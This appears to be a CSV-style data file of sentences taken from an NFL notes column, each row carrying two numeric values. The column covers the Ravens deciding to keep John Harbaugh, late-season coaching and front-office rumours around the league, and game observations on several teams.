"There was no shortage of teams that had an interest in Harbaugh.",-1,0
"The Jets were one.",-1,0
"The Broncos were another.",-1,0
"And it was never hard to see why.",-1,0
"Harbaugh made the playoff six times in his first decade with the Ravens, winning at least once in the postseason in each of those seasons, while taking home a Super Bowl title in 2012.",-1,0
"So Baltimore decided over the last week that, at the very least, theyre not going to just let him walk.",-1,0
"Which is wise of them, in the same way its wise of other teams to make sure theyre happy with whats out there in the marketplace before deciding to sever ties with the coach theyve got now.",-1,0
"And theres also the way that Harbaugh handled the situation with his players when the rumblings really got going.",-1,0
"Veteran safety Eric Weddle explained that the coach told them hed been in contact with owner Steve Bisciotti throughout and that, while he wasnt certain of his own future, they didnt need to worry about him.",-1,0
"He then told the players, Im with you and Im for you.",-1,0
"Its nice to put it to rest, Weddle said via text late Saturday, after the Ravens beat the Chargers in Los Angeles.",-1,0
"Hes been very up front and honest with us, and hes done an amazing job keeping us together, to have us in the position were in right now.",-1,0
"Its how honest hes been and how hes believed from Day 1.",-1,0
"His love and belief really have resonated through the entire team.",-1,0
"Maybe the biggest compliment the players could give Harbaugh, though, came in how they played against the Chargersbecause it completely reflected their coachs vision for a program and a team.",-1,0
"Against another pretty physical group, Baltimore controlled the line on scrimmage, nearly doubling up the Chargers in scrimmage yards (361-198) and tripling them on the ground (159-51).",-1,0
"It also showed up in how Baltimore wound up breaking their hostspunching the ball out lateand also in how the Ravens handled the circumstance of traveling cross-country on a short week to play a really good team coming off nine days rest.",-1,0
"Afterwards, Harbaugh told the players that the Ravens are a strong, butt-kicking outfit, and gave the game ball to strength coach Steve Saunders.",-1,0
"But the guys in the locker room know that reaching this pointa win against Cleveland next Sunday and theyre division champs, something that seemed out of the question midway through the seasonhas had as much to do with the guy whos setting their course.",-1,0
"One-hundred percent, Weddle said.",-1,0
"We want to hit people in the mouthphysical in all three phases, make em quit in the fourth.",-1,0
"Thats pretty much how it played out, and the Ravens organization signed up for more of it.",-1,0
"So with that theme as the backdrop, and seven days ahead of Black Monday, some nuggets from the rumor mill:
Panthers GM Marty Hurney has built a good rapport with new owner David Tepper, Im told, and so he and coach Ron Rivera are very likely to get at least another year.",-1,0
"I dont think its out of the realm of possibility that someone could be added to football ops.",-1,0
"Teppers shown a keen awareness in the area of football analytics, so maybe thats where a hire is made.",-1,0
"At the very least, with offensive coordinator Byron Leftwich not quite ready for the role he was thrust into in October, the Cardinals will make major changes to its offensive staff.",-1,0
"And theres a pretty decent chance that owner Michael Bidwill goes beyond just that.",-1,0
"First-year coach Steve Wilks is in peril.",-1,0
"It remains to be seen whether or not GM Steve Keim is, too.",-1,0
"If Keim is out in Arizona, word is that hell be a top candidate for the GM job with the Raiders, who would prefer to bring in an experienced personnel man.",-1,0
"The Buccaneers are a little like Arizona in that word has held that the coach, Dirk Koettter, is likely to be gone, particularly with a staff full of assistants on expiring deals, but the situation of GM Jason Licht seems to be murkier.",-1,0
"This job is the one that ex-Packers coach Mike McCarthy has been connected most to.",-1,0
"The Dolphins will almost certainly have change at some level.",-1,0

"As weve mentioned at a few points over the last few months, Broncos GM John Elway dove deep into offensive trends in the college game during the fall.",-1,0
"So an outside-the-box hire wouldnt be out of the question, assuming the scenario of John Harbaugh coming over, with Gary Kubiak as OC, is now dead.",-1,0
"As for the Bengals, theres been talk that owner Mike Brown could take one more run at it with Marvin Lewis in charge in 2019, before Brown cedes more control of the team  than he already has to his children after next season.",-1,0

"The people at BRANDed PR and FOCO sent me a Patriots Christmas sweater a few weeks back, and I let it sit on my desk (for obvious reasons, I dont wear any NFL team gear, nor do I root for a team).",-1,0
"Then last week, I saw the reaction Bears QB Mitchell Trubisky got for wearing the Chicago version of the sweater as his press conference, and I figured I could use this one to raise some money for BCH (where my wife is a nurse).",-1,0

"The pass-interference call on Joe Haden in the end zone, where the Steelers corner barely rubbed elbows with Alvin Kamara, was one of the worst weve seen all year without adding context to it.",-1,0
"When you throw in the fact that it was on a fourth-and-1 from the Steelers 34, gave the Saints 33 yards and the game was decided by three points?",-1,0

"Yes, new Vikings coordinator Kevin Stefanski has cut down the volume in the offense, and thats helped guys play faster.",-1,0
"But more than that, as the Vikings players have seen it, hes leaned on elements he knew made the offense successful under Pat Shurmur in 2017.",-1,0
"Two pieces of evidence?",-1,0
"One, Stefanski will repeat run calls that are working more often.",-1,0

"At this point, particularly with Sammy Watkins down, Kareem Hunt gone and Tyreek Hill nicked up, Kansas City is going to need Patrick Mahomes to walk on water in the playoffs.",-1,0

"Good news and bad news for the Patriots offense in its first game ost-Josh Gordon.",-1,0
"Good news: New England rang up a whopping 273 yards on 47 carries, and Sony Michel (18 carries, 116 yards) looked every bit the bell cow in how he ran through contact in the 24-12 win over the Bills.",-1,0
"Bad news: Tom Bradys 48.3 passer rating was the worst hes ever posted in a win, and potential Gordon replacements Corddarelle Patterson, Chris Hogan and Phillip Dorsett combined for one catch for three yards.",-1,0

"And I know the players are seeing that not just on Sunday, but Monday through Saturday as well.",-1,0
"Second, Nagy is showing faith in those guys in his aggressivenessand in particular on the fourth-and-1 he went for from his own 35, up 14-9 with 4:10 left.",-1,0
"The Bears picked up the first down with a Mitch Trubsiky sneak.",-1,0
"Allen Robinson fumbled the ball away six plays later, but that doesnt change my outlook on these kinds of calls.",-1,0
